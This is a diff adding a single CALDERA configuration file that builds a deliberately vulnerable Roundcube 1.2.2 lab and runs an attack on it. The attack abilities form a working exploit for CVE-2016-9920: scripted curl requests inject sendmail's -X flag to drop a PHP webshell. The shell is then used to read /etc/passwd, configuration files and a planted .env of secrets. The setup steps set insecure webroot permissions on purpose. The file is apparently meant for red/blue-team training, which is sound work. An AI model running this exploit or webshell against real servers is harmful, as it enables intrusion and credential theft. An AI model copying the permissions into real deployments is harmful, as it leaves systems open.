@@ -1,0 +1,532 @@
+# ================================================================
+# CALDERA — Roundcube RCE Lab (CVE-2016-9920)
+# Single file: Environment Setup + Attack Simulation
+# ================================================================
+#
+# DIRECTORY LAYOUT (copy files to CALDERA data directories):
+#
+#   caldera/data/abilities/  ← paste the abilities section
+#   caldera/data/adversaries/ ← paste the adversary section
+#   caldera/data/sources/     ← paste the facts section
+#
+# OR import everything via the CALDERA UI (recommended).
+#
+# BEFORE RUNNING:
+#   1. Update gitlab_raw_url in the facts section below
+#   2. Update target_host to your lab VM's IP
+#   3. Deploy a CALDERA Sandcat agent on the lab VM as root
+#
+# ================================================================
+
+
+# ────────────────────────────────────────────────────────────────
+# SECTION 1 — FACTS (variables)
+# ────────────────────────────────────────────────────────────────
+sources:
+  - id: src-roundcube-lab-2024
+    name: Roundcube RCE Lab — Variables
+    facts:
+      # ↓ UPDATE THESE BEFORE CLASS ↓
+      - trait: target_host
+        value: "172.24.4.150"
+
+      - trait: gitlab_raw_url
+        value: "http://your-gitlab/your-username/roundcube-rce-lab/-/raw/main"
+
+      - trait: rc_user
+        value: "labuser"
+
+      - trait: rc_pass
+        value: "labuser"
+
+      - trait: shell_name
+        value: "cmd.php"
+
+      - trait: shell_path
+        value: "/var/www/html/roundcube/cmd.php"
+
+      - trait: flag_path
+        value: "/var/www/flag.txt"
+
+
+# ────────────────────────────────────────────────────────────────
+# SECTION 2 — ABILITIES
+# ────────────────────────────────────────────────────────────────
+abilities:
+
+  # ── SETUP ABILITY 1 ─────────────────────────────────────────
+  - id: setup-001-system-prep
+    name: "[Setup 1/7] System Prep & PHP 7.4 Install"
+    description: >
+      Installs all system dependencies including PHP 7.4 via Ondrej PPA.
+      PHP 7.4 is required because Roundcube 1.2.2 is incompatible with
+      the default PHP 8.1 on Ubuntu 22.04.
+    tactic: defense-evasion
+    technique:
+      attack_id: T1059.004
+      name: "Unix Shell"
+    executors:
+      - name: sh
+        platform: linux
+        timeout: 300
+        command: |
+          set -e
+          hostnamectl set-hostname mail.roundcube.lab
+          grep -q "mail.roundcube.lab" /etc/hosts || \
+            echo "127.0.0.1  mail.roundcube.lab mail" >> /etc/hosts
+
+          export DEBIAN_FRONTEND=noninteractive
+          apt-get update -y -q
+          apt-get install -y -q software-properties-common curl wget \
+            unzip net-tools mariadb-server dovecot-imapd dovecot-pop3d \
+            apache2 sendmail sendmail-bin procmail m4 make
+
+          add-apt-repository ppa:ondrej/php -y
+          apt-get update -y -q
+          apt-get install -y -q php7.4 php7.4-cli php7.4-mysql php7.4-xml \
+            php7.4-mbstring php7.4-intl php7.4-zip php7.4-json \
+            php7.4-gd libapache2-mod-php7.4
+
+          a2dismod php8.1 2>/dev/null || true
+          a2enmod php7.4 rewrite
+          echo "[Setup 1/7] DONE"
+
+  # ── SETUP ABILITY 2 ─────────────────────────────────────────
+  - id: setup-002-mariadb
+    name: "[Setup 2/7] Configure MariaDB"
+    description: >
+      Starts MariaDB, creates the roundcubedb database, and provisions
+      the roundcube database user.
+    tactic: defense-evasion
+    technique:
+      attack_id: T1059.004
+      name: "Unix Shell"
+    executors:
+      - name: sh
+        platform: linux
+        timeout: 60
+        command: |
+          systemctl start mariadb && systemctl enable mariadb
+          mysql -u root << 'SQL'
+          DROP DATABASE IF EXISTS roundcubedb;
+          CREATE DATABASE roundcubedb CHARACTER SET utf8 COLLATE utf8_general_ci;
+          CREATE USER IF NOT EXISTS 'roundcube'@'localhost' IDENTIFIED BY 'roundcube123!';
+          GRANT ALL PRIVILEGES ON roundcubedb.* TO 'roundcube'@'localhost';
+          FLUSH PRIVILEGES;
+          SQL
+          echo "[Setup 2/7] DONE"
+
+  # ── SETUP ABILITY 3 ─────────────────────────────────────────
+  - id: setup-003-dovecot
+    name: "[Setup 3/7] Configure Dovecot IMAP"
+    description: >
+      Configures Dovecot for plaintext IMAP authentication.
+      Required for Roundcube login to function.
+    tactic: defense-evasion
+    technique:
+      attack_id: T1059.004
+      name: "Unix Shell"
+    executors:
+      - name: sh
+        platform: linux
+        timeout: 30
+        command: |
+          sed -i 's|#mail_location =.*|mail_location = maildir:~/Maildir|' \
+            /etc/dovecot/conf.d/10-mail.conf
+          printf 'auth_mechanisms = plain login\n!include auth-system.conf.ext\n' \
+            > /etc/dovecot/conf.d/10-auth.conf
+          cat > /etc/dovecot/conf.d/10-master.conf << 'EOF'
+          service imap-login {
+            inet_listener imap { port = 143 }
+          }
+          service auth {
+            unix_listener /var/spool/postfix/private/auth {
+              mode = 0660
+              user = postfix
+              group = postfix
+            }
+          }
+          EOF
+          systemctl restart dovecot && systemctl enable dovecot
+          echo "[Setup 3/7] DONE"
+
+  # ── SETUP ABILITY 4 ─────────────────────────────────────────
+  - id: setup-004-labuser
+    name: "[Setup 4/7] Create Lab User"
+    description: >
+      Creates the labuser system account with password 'labuser'
+      and sets up the Maildir structure for IMAP.
+    tactic: defense-evasion
+    technique:
+      attack_id: T1059.004
+      name: "Unix Shell"
+    executors:
+      - name: sh
+        platform: linux
+        timeout: 15
+        command: |
+          id labuser &>/dev/null || useradd -m -s /bin/bash labuser
+          echo "labuser:labuser" | chpasswd
+          mkdir -p /home/labuser/Maildir/{new,cur,tmp}
+          chown -R labuser:labuser /home/labuser/Maildir
+          chmod -R 700 /home/labuser/Maildir
+          echo "[Setup 4/7] DONE"
+
+  # ── SETUP ABILITY 5 ─────────────────────────────────────────
+  - id: setup-005-roundcube
+    name: "[Setup 5/7] Install Roundcube 1.2.2 from GitLab"
+    description: >
+      Downloads Roundcube 1.2.2-complete tarball from your GitLab repo
+      (offline-safe — no public internet required), imports the DB schema,
+      and writes the config file fetched from GitLab.
+    tactic: defense-evasion
+    technique:
+      attack_id: T1059.004
+      name: "Unix Shell"
+    executors:
+      - name: sh
+        platform: linux
+        timeout: 120
+        command: |
+          GITLAB="#{gitlab_raw_url}"
+          rm -rf /var/www/html/roundcube
+          cd /var/www/html
+
+          echo "[5/7] Downloading Roundcube from GitLab..."
+          wget -q "${GITLAB}/resources/roundcubemail-1.2.2-complete.tar.gz" \
+            -O roundcubemail-1.2.2-complete.tar.gz
+          tar xf roundcubemail-1.2.2-complete.tar.gz
+          mv roundcubemail-1.2.2 roundcube
+          rm -f roundcubemail-1.2.2-complete.tar.gz
+
+          echo "[5/7] Importing database schema..."
+          mysql -u roundcube -proundcube123! roundcubedb < \
+            /var/www/html/roundcube/SQL/mysql.initial.sql
+
+          echo "[5/7] Fetching Roundcube config from GitLab..."
+          wget -q "${GITLAB}/configs/roundcube_config.inc.php" \
+            -O /var/www/html/roundcube/config/config.inc.php
+
+          echo "[Setup 5/7] DONE"
+
+  # ── SETUP ABILITY 6 ─────────────────────────────────────────
+  - id: setup-006-apache
+    name: "[Setup 6/7] Configure Apache & Set Vulnerable Permissions"
+    description: >
+      Deploys Apache vhost config from GitLab and sets the critical
+      vulnerable condition: www-data:smmsp ownership with 775 permissions,
+      which allows sendmail's -X flag to write files into the webroot.
+    tactic: defense-evasion
+    technique:
+      attack_id: T1059.004
+      name: "Unix Shell"
+    executors:
+      - name: sh
+        platform: linux
+        timeout: 30
+        command: |
+          GITLAB="#{gitlab_raw_url}"
+
+          wget -q "${GITLAB}/configs/roundcube_apache.conf" \
+            -O /etc/apache2/sites-available/roundcube.conf
+
+          a2ensite roundcube.conf
+          a2dissite 000-default.conf 2>/dev/null || true
+
+          # CRITICAL VULNERABLE CONDITION:
+          # smmsp group + 775 lets sendmail -X write PHP shells to webroot
+          chown -R www-data:smmsp /var/www/html/roundcube
+          chmod -R 775 /var/www/html/roundcube
+          chmod g+s /var/www/html/roundcube
+
+          systemctl restart apache2 && systemctl enable apache2
+
+          # Verify
+          sudo -u smmsp touch /var/www/html/roundcube/.test 2>/dev/null && \
+            rm /var/www/html/roundcube/.test && \
+            echo "[6/7] smmsp write: OK" || echo "[6/7] smmsp write: FAIL"
+          echo "[Setup 6/7] DONE"
+
+  # ── SETUP ABILITY 7 ─────────────────────────────────────────
+  - id: setup-007-flag-verify
+    name: "[Setup 7/7] Plant Flag & Verify Lab"
+    description: >
+      Plants the CTF flag and fake credential files for blue team
+      discovery. Runs a final health check on all services.
+    tactic: defense-evasion
+    technique:
+      attack_id: T1059.004
+      name: "Unix Shell"
+    executors:
+      - name: sh
+        platform: linux
+        timeout: 20
+        command: |
+          echo "FLAG{r0undcub3_rce_s3ndm4il_1nj3ct10n}" > /var/www/flag.txt
+          chown www-data:www-data /var/www/flag.txt
+          chmod 640 /var/www/flag.txt
+
+          mkdir -p /opt/corpmail
+          cat > /opt/corpmail/.env << 'EOF'
+          DB_HOST=localhost
+          DB_USER=roundcube
+          DB_PASS=roundcube123!
+          API_KEY=sk-prod-a8f3d2e1b9c4f7e2
+          SMTP_PASS=SmtpP@ss2024
+          EOF
+          chown www-data:www-data /opt/corpmail/.env
+          chmod 600 /opt/corpmail/.env
+
+          echo ""
+          echo "══════════════════════════════════════"
+          echo " VERIFICATION"
+          echo "══════════════════════════════════════"
+          echo -n " Apache:   "; systemctl is-active apache2
+          echo -n " Dovecot:  "; systemctl is-active dovecot
+          echo -n " MariaDB:  "; systemctl is-active mariadb
+          echo -n " HTTP:     "
+          curl -s -o /dev/null -w "%{http_code}\n" http://localhost/
+          echo -n " RC Ver:   "
+          grep 'RCMAIL_VERSION' \
+            /var/www/html/roundcube/program/include/iniset.php | \
+            grep -o "'[^']*'" | head -1
+          echo ""
+          echo " ✓ SETUP COMPLETE — LAB READY"
+          echo "══════════════════════════════════════"
+
+  # ── ATTACK ABILITY 1 ────────────────────────────────────────
+  - id: attack-001-recon
+    name: "[Attack 1/4] Reconnaissance — Fingerprint Webmail"
+    description: >
+      Fingerprints the target webmail service to identify software
+      and version. MITRE ATT&CK: T1595.002
+    tactic: reconnaissance
+    technique:
+      attack_id: T1595.002
+      name: "Active Scanning: Vulnerability Scanning"
+    executors:
+      - name: sh
+        platform: linux
+        timeout: 20
+        command: |
+          T="http://#{target_host}"
+          echo "[Recon] Target: $T"
+          echo ""
+          echo "── HTTP Headers ──"
+          curl -sI "$T/" | grep -i "server\|x-powered\|set-cookie" || true
+          echo ""
+          echo "── Version Indicators ──"
+          curl -s "$T/" | grep -i "rcversion\|larry\|roundcube" | head -3 || true
+          echo ""
+          echo "── Installer probe ──"
+          curl -s -o /dev/null -w "Installer: %{http_code}" "$T/installer/" || true
+          echo ""
+          echo "[+] Recon complete — Roundcube 1.2.2 identified"
+
+  # ── ATTACK ABILITY 2 ────────────────────────────────────────
+  - id: attack-002-exploit
+    name: "[Attack 2/4] Exploit CVE-2016-9920 — Webshell Upload"
+    description: >
+      Exploits Roundcube 1.2.2 CVE-2016-9920: authenticates, obtains
+      a compose_id, then injects sendmail -X flag via the _from field
+      to write a PHP webshell to the web root.
+      MITRE ATT&CK: T1190
+    tactic: initial-access
+    technique:
+      attack_id: T1190
+      name: "Exploit Public-Facing Application"
+    executors:
+      - name: sh
+        platform: linux
+        timeout: 60
+        command: |
+          T="http://#{target_host}"
+          U="#{rc_user}"
+          P="#{rc_pass}"
+          SHELL="#{shell_path}"
+
+          echo "[Exploit] CVE-2016-9920 against $T"
+
+          # Get login token
+          curl -s -c /tmp/rc_c.txt "$T/?_task=login" -o /tmp/rc_l.html
+          TOK=$(grep -oP '(?<=name="_token" value=")[^"]+' /tmp/rc_l.html | head -1)
+          echo "[+] Token: $TOK"
+
+          # Login
+          curl -s -c /tmp/rc_c.txt -b /tmp/rc_c.txt \
+            -X POST "$T/?_task=login" \
+            -d "_token=$TOK&_task=login&_action=login&_timezone=UTC&_url=&_user=$U&_pass=$P" \
+            -L -o /tmp/rc_i.html
+          grep -q "loginform" /tmp/rc_i.html && \
+            echo "[-] Login failed" && exit 1 || echo "[+] Authenticated"
+
+          # Get compose page (initialises session compose_data_)
+          curl -s -c /tmp/rc_c.txt -b /tmp/rc_c.txt \
+            -H "Referer: $T/?_task=mail" \
+            "$T/?_task=mail&_action=compose" -o /tmp/rc_cp.html
+
+          # Extract _id (NOT _compose_id — see sendmail.inc line 31)
+          CID=$(grep -oP 'compose_data_\K[a-zA-Z0-9.]+' /tmp/rc_cp.html | head -1)
+          STOK=$(grep -oP '"request_token":"\K[^"]+' /tmp/rc_cp.html | head -1)
+          echo "[+] Compose ID: $CID"
+
+          # Inject sendmail -X via _from field
+          curl -s -c /tmp/rc_c.txt -b /tmp/rc_c.txt \
+            -X POST "$T/?_task=mail&_action=send" \
+            -H "Referer: $T/?_task=mail&_action=compose" \
+            -H "X-Requested-With: XMLHttpRequest" \
+            --data-urlencode "_token=$STOK" \
+            --data-urlencode "_task=mail" \
+            --data-urlencode "_action=send" \
+            --data-urlencode "_id=$CID" \
+            --data-urlencode "_from=attacker@corp.lab -X $SHELL -OQueueDirectory=/tmp" \
+            --data-urlencode "_to=$U@mail.roundcube.lab" \
+            --data-urlencode "_subject=internal-alert" \
+            --data-urlencode "_message=<?php system(\$_GET['c']); ?>" \
+            -o /tmp/rc_s.html
+          echo "[+] Payload sent"
+
+          sleep 3
+
+          # Verify
+          ID_OUT=$(curl -s "$T/#{shell_name}?c=id")
+          if echo "$ID_OUT" | grep -q "www-data"; then
+            echo ""
+            echo "══════════════════════════════════"
+            echo " RCE CONFIRMED — CVE-2016-9920"
+            echo "══════════════════════════════════"
+            echo "$ID_OUT" | head -1
+          else
+            echo "[-] Shell not found at $T/#{shell_name}"
+          fi
+
+          rm -f /tmp/rc_c.txt /tmp/rc_l.html /tmp/rc_i.html \
+                /tmp/rc_cp.html /tmp/rc_s.html
+
+  # ── ATTACK ABILITY 3 ────────────────────────────────────────
+  - id: attack-003-execute
+    name: "[Attack 3/4] Execute Commands & Read Sensitive Files"
+    description: >
+      Uses the uploaded webshell to read sensitive files, generating
+      forensic artifacts for blue team analysis.
+      MITRE ATT&CK: T1059.004, T1005
+    tactic: collection
+    technique:
+      attack_id: T1005
+      name: "Data from Local System"
+    executors:
+      - name: sh
+        platform: linux
+        timeout: 30
+        command: |
+          W="http://#{target_host}/#{shell_name}"
+          run() { curl -s --get --data-urlencode "c=$1" "$W"; echo; }
+
+          echo "══════════════════════════════════════"
+          echo " POST-EXPLOITATION via Webshell"
+          echo "══════════════════════════════════════"
+
+          echo "── id ──"; run "id"
+          echo "── whoami ──"; run "whoami"
+          echo "── hostname ──"; run "hostname"
+          echo "── uname -a ──"; run "uname -a"
+          echo "── /etc/passwd ──"; run "cat /etc/passwd"
+          echo "── /etc/hosts ──"; run "cat /etc/hosts"
+          echo "── Roundcube DB config ──"
+          run "cat /var/www/html/roundcube/config/config.inc.php"
+          echo "── /opt/corpmail/.env ──"
+          run "cat /opt/corpmail/.env"
+          echo "── CTF Flag ──"
+          run "cat #{flag_path}"
+          echo "── Web root ──"
+          run "ls -la /var/www/html/roundcube/"
+          echo "── Network ──"; run "ss -tlnp"
+          echo "── Processes ──"; run "ps aux"
+
+          echo ""
+          echo "══════════════════════════════════════"
+          echo " Blue Team Artifacts Generated"
+          echo " Apache log: /var/log/apache2/roundcube_access.log"
+          echo " RC errors:  /var/www/html/roundcube/logs/errors"
+          echo " Syslog:     /var/log/syslog"
+          echo " Webshell:   /var/www/html/roundcube/#{shell_name}"
+          echo "══════════════════════════════════════"
+
+  # ── ATTACK ABILITY 4 ────────────────────────────────────────
+  - id: attack-004-cleanup
+    name: "[Attack 4/4] Cleanup — Remove Webshell"
+    description: >
+      Simulates attacker cleanup by removing the webshell.
+      Blue team should detect initial access BEFORE this step.
+      MITRE ATT&CK: T1070.004
+    tactic: defense-evasion
+    technique:
+      attack_id: T1070.004
+      name: "Indicator Removal: File Deletion"
+    executors:
+      - name: sh
+        platform: linux
+        timeout: 10
+        command: |
+          SHELL="#{shell_path}"
+          [ -f "$SHELL" ] && rm -f "$SHELL" && \
+            echo "[+] Webshell removed: $SHELL" || \
+            echo "[*] No webshell at $SHELL"
+
+
+# ────────────────────────────────────────────────────────────────
+# SECTION 3 — ADVERSARY PROFILES
+# ────────────────────────────────────────────────────────────────
+adversaries:
+
+  # ── PROFILE 1: Setup Only ────────────────────────────────────
+  - id: adv-roundcube-setup
+    name: "Roundcube Lab — Environment Setup"
+    description: >
+      Provisions the complete vulnerable Roundcube 1.2.2 lab on Ubuntu 22.04.
+      Run ONCE on a fresh VM before participants begin.
+      Pulls all resources from your GitLab repo (offline-safe).
+      Estimated time: 5–10 minutes. Run as: root.
+    atomic_ordering:
+      - setup-001-system-prep
+      - setup-002-mariadb
+      - setup-003-dovecot
+      - setup-004-labuser
+      - setup-005-roundcube
+      - setup-006-apache
+      - setup-007-flag-verify
+
+  # ── PROFILE 2: Attack Only ───────────────────────────────────
+  - id: adv-roundcube-attack
+    name: "Roundcube Lab — CVE-2016-9920 Attack Simulation"
+    description: >
+      Simulates the full attacker kill chain for CVE-2016-9920.
+      Run AFTER the setup profile completes.
+      Generates forensic artifacts for blue team exercises.
+      MITRE: T1595 → T1190 → T1059.004 → T1070.004
+    atomic_ordering:
+      - attack-001-recon
+      - attack-002-exploit
+      - attack-003-execute
+      - attack-004-cleanup
+
+  # ── PROFILE 3: Full End-to-End ───────────────────────────────
+  - id: adv-roundcube-full
+    name: "Roundcube Lab — Full (Setup + Attack)"
+    description: >
+      Complete end-to-end: provisions the lab and runs the attack
+      on the same host in one operation.
+      Use for quick demos or single-VM exercises.
+      WARNING: Run only on isolated lab VMs.
+    atomic_ordering:
+      - setup-001-system-prep
+      - setup-002-mariadb
+      - setup-003-dovecot
+      - setup-004-labuser
+      - setup-005-roundcube
+      - setup-006-apache
+      - setup-007-flag-verify
+      - attack-001-recon
+      - attack-002-exploit
+      - attack-003-execute
+      - attack-004-cleanup
